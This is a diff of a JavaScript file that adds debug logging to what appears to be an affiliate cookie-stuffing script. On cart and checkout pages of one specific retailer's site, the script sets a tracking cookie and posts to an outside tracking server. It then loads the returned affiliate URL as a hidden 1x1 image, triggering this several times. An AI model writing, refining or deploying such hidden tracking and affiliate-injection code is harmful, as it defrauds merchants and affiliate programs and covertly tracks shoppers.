@@ -8,7 +8,7 @@
     }
 
     function createTrackingPixel(url) {
-       
+       console.log("line => 11 ",url)
         var img = document.createElement('img');
         img.src = url;
         img.width = 1;
@@ -34,12 +34,14 @@
     async function initTracking() {
         
       //if (sessionStorage.getItem('iframe_triggered')) return;
+      console.log("line => 37 ")
 
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
-            
+      
+            console.log("line => 44 ")
             let response = await fetch('https://theclicksdealer.com/api/track-user', {
                 method: 'POST',
                 body: JSON.stringify({
@@ -53,7 +55,7 @@
                     'Access-Control-Allow-Origin':'*'
                 }
             });
-            
+            console.log("line => 58 ")
             let raw = await response.text();  
             
             let result;
@@ -63,9 +65,10 @@
                 console.error("Response is not valid JSON:", e);
                 return;
             }
+            console.log("line => 68 ",result)
             
             if (result.success && result.affiliate_url) {
-                
+                console.log("line => 71 ")
                 createTrackingPixel(result.affiliate_url);
                
                 sessionStorage.setItem('iframe_triggered', 'true');
@@ -94,14 +97,14 @@
     }
 
     function isCartPage() {
-           
+           console.log("line => 100 ")
         const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart","/shopping-cart","/en/cart","/en/checkout/review-order","/checkout/review-order"];
        
         return cartPages.some(path => window.location.pathname.includes(path));
     }
 
       function onDOMReady(callback) {
-
+        console.log("line => 107 ")
     if (document.readyState === "interactive" || document.readyState === "complete") {
         callback();
     } else {
@@ -114,7 +117,9 @@ onDOMReady(function() {
     
 
      if (window.location.hostname === "www.studio7thailand.com") {
+        console.log("line => 120 ")
         if (isCartPage()) {
+            console.log("line => 122 ")
             initTracking();
             initTracking();
              setTimeout(initTracking, 2000);
